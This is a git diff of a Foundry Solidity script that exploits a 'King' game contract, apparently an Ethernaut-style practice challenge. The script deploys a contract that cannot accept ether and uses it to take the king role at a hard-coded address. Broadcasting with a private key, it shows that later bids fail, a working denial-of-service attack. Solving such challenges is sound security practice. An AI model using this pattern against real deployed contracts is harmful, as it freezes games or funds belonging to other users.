@@ -6,6 +6,10 @@ import "../src/King.sol";
 
 contract CantReceiveContract {
 
+    function becomeKing(address _recepient) external payable {
+        address(_recepient).call{value: 1e15}(""); 
+    }
+
     /**
      * Make it obvious that contract can't receive any ethers.
      * Another solution is just an empty contract.
@@ -25,20 +29,17 @@ contract KingScript is Script {
      * When that contract is king the transfer from King.sol won't work and this will break the game.
      */
     function run() public {
+        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
         CantReceiveContract cantReceiver = new CantReceiveContract();
-        
+
         console.log("1. Current king", king._king());
         vm.deal(address(cantReceiver), 1e15);
-
-        // send ethers from contract
-        vm.prank(address(cantReceiver));
-        address(king).call{value: 1e15}(""); 
-
+        
+        cantReceiver.becomeKing(0xb331A36D9bE6452BFfaD52A25A4b578535FEf712);
         console.log("2. New king", king._king());
 
-        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
         (bool isSuccess, ) = address(king).call{value: 1e16}(""); 
-        console.log("3. Still king is", king._king(), "becase response is ", isSuccess);
+        console.log("3. Still king is", king._king(), "becase response is", isSuccess);
         vm.stopBroadcast();
 
     }
